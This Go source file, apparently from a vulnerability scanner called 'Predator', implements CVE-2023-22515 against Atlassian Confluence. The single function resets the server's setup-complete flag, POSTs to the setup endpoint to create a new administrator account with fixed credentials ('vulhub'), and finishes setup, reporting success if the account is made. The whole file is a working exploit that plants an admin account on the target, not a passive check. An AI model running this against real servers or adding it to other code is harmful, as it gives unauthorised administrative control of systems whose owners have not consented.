package confluence

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2023_22515(u string) bool {
	headers := make(map[string]string, 0)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	headers["X-Atlassian-Token"] = "no-check"
	if req, err := utils.HttpRequset(u+"/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "success") {
			if req1, err := utils.HttpRequset(u+"/setup/setupadministrator.action", "POST", "username=vulhub&fullName=vulhub&email=admin%40vulhub.org&password=vulhub&confirm=vulhub&setup-next-button=Next", false, headers); err == nil {
				if req1.StatusCode == 302 {
					if req2, err := utils.HttpRequset(u+"/setup/finishsetup.action", "GET", "", false, nil); err == nil {
						if req2.StatusCode == 200 && strings.Contains(req2.Body, "Setup Successful") {
							return true
						}
					}
				}
			}
		}
	}
	return false
}
